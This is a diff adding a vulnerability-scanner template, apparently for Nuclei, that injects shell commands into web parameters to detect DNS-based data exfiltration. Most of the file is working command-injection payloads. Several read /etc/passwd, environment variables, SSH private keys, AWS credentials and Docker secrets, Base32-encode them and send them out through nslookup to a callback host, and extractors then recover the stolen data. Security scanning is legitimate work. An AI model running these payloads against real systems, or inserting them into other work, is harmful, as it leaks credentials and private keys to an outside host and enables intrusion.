@@ -1,0 +1,257 @@
+id: dns-data-exfiltration-base32-oob
+
+info:
+  name: DNS Data Exfiltration with Base32 Encoding OOB
+  author: geeknik
+  severity: high
+  description: |
+    Detects vulnerabilities that allow data exfiltration through DNS queries using
+    Base32 encoding for steganographic data transmission. Tests various injection
+    points that could leak sensitive information via DNS lookups with error
+    correction and data integrity verification.
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/dns-rebinding
+    - https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/
+    - https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152
+    - https://attack.mitre.org/techniques/T1048/003/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-200,CWE-212
+  tags: dns,exfiltration,base32,steganography,oob,data-leak,covert-channel
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  exfil_id: "{{randstr}}"
+  test_data: "SECRET_DATA_{{randstr}}"
+  dns_exfil_payload: |
+    # Linux/Unix DNS exfiltration payloads with Base32 encoding
+
+    # Basic command execution with DNS exfiltration
+    $(nslookup "$(echo '{{test_data}}' | base32 | tr -d '=' | head -c 20).start.{{callback_url}}")
+
+    # File content exfiltration
+    $(nslookup "$(cat /etc/passwd | base32 | tr -d '=' | head -c 30).passwd.{{callback_url}}")
+
+    # Environment variable exfiltration
+    $(nslookup "$(env | base32 | tr -d '=' | head -c 25).env.{{callback_url}}")
+
+    # Current user and working directory
+    $(nslookup "$(whoami | base32).$(pwd | base32 | head -c 15).user.{{callback_url}}")
+
+    # Network interface information
+    $(nslookup "$(ifconfig | base32 | head -c 20).network.{{callback_url}}")
+
+    # Process list exfiltration
+    $(nslookup "$(ps aux | base32 | head -c 30).processes.{{callback_url}}")
+
+    # SSH keys exfiltration
+    $(nslookup "$(cat ~/.ssh/id_rsa 2>/dev/null | base32 | head -c 40).sshkey.{{callback_url}}")
+
+    # Database connection strings
+    $(nslookup "$(grep -r "password" /var/www/ 2>/dev/null | base32 | head -c 35).dbpass.{{callback_url}}")
+
+    # AWS credentials exfiltration
+    $(nslookup "$(cat ~/.aws/credentials 2>/dev/null | base32 | head -c 45).aws.{{callback_url}}")
+
+    # Docker secrets
+    $(nslookup "$(find /var/lib/docker -name "*.json" -exec cat {} \; 2>/dev/null | base32 | head -c 30).docker.{{callback_url}}")
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/config"
+      - "{{BaseURL}}/debug"
+
+    payloads:
+      param:
+        - "q"
+        - "search"
+        - "query"
+        - "filter"
+        - "cmd"
+        - "debug"
+        - "test"
+        - "eval"
+        - "exec"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}={{dns_exfil_payload}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/query"
+      - "{{BaseURL}}/eval"
+      - "{{BaseURL}}/exec"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:
+        - "q"
+        - "query"
+        - "search"
+        - "cmd"
+        - "command"
+        - "eval"
+        - "expression"
+
+    body: "{{param}}={{dns_exfil_payload}}"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/eval"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      field:
+        - "query"
+        - "search"
+        - "expression"
+        - "command"
+        - "eval"
+
+    body: |
+      {
+        "{{field}}": "{{dns_exfil_payload}}"
+      }
+
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/config"
+      - "{{BaseURL}}/settings"
+      - "{{BaseURL}}/admin/config"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "dns_server": "{{callback_url}}",
+        "lookup_command": "nslookup $(echo '{{test_data}}' | base32).config.{{callback_url}}",
+        "resolver": "$(nslookup test.{{callback_url}})"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/log"
+      - "{{BaseURL}}/admin/log"
+      - "{{BaseURL}}/debug/log"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "message": "Error: $(nslookup $(echo 'LOG_DATA_{{exfil_id}}' | base32).log.{{callback_url}})",
+        "level": "debug",
+        "context": "$(nslookup $(date | base32).timestamp.{{callback_url}})"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/email"
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "email": "test@$(nslookup $(echo 'EMAIL_TEST_{{exfil_id}}' | base32).email.{{callback_url}})",
+        "message": "DNS lookup test",
+        "subject": "Test $(nslookup $(echo 'SUBJECT_{{exfil_id}}' | base32).subject.{{callback_url}})"
+      }
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/redirect"
+      - "{{BaseURL}}/proxy"
+
+    payloads:
+      param:
+        - "url"
+        - "target"
+        - "redirect"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}=http://$(nslookup $(echo 'REDIRECT_{{exfil_id}}' | base32).redirect.{{callback_url}}) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+        condition: and
+
+      - type: word
+        part: interactsh_request
+        words:
+          - ".start."
+          - ".passwd."
+          - ".env."
+          - ".user."
+          - ".network."
+          - ".processes."
+          - ".sshkey."
+          - ".dbpass."
+          - ".aws."
+          - ".docker."
+          - ".config."
+          - ".log."
+          - ".email."
+          - ".subject."
+          - ".redirect."
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - interactsh_request
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "([A-Z2-7]{8,})\\.([a-z]+)\\."
+        group: 1
+        name: extracted_data
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "([A-Z2-7]{8,})\\.([a-z]+)\\."
+        group: 2
+        name: extracted_type
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "^([^.]+)"
+        group: 1
